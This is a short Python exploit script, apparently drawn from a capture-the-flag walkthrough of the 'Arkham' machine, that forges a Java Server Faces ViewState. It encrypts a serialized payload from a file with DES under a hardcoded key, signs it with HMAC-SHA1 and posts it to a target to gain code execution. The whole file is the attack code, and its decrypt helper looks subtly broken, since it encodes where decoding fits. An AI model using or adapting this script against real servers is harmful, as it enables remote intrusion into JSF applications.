import pyDes, hmac
from base64 import b64decode, b64encode
from hashlib import sha1
import requests

#from ippsec Arkham ~25min
url = 'http://1.1.1.1/aaa.faces'

def create_payload():
	payload = open('payload.bin', 'rb').read()
	return encrypt_payload(payload)
	
def encrypt_payload(payload):
	key = b64decode('Ba3kdjF2==')
	obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)	
	enc = obj.encrypt(payload)
	hash_val = (hmac.new(key, bytes(enc), sha1).digest())
	payload = enc + hash_val
	return b64encode(payload)
	

def deecrypt_view_state(view_state):
	key = b64decode('Ba3kdjF2==')
	obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)
	view_state = b64encode(view_state)
	view_state = view_state + b'\x00\x00\x00\x00'
	dec = obj.decrypt(view_state)
	return dec
	
	
def exploit():
	view_state = create_payload()
	data = { 'javax.faces.ViewState' : view_state } 
	r = requests.post(url, data=data)
	
print(create_payload())
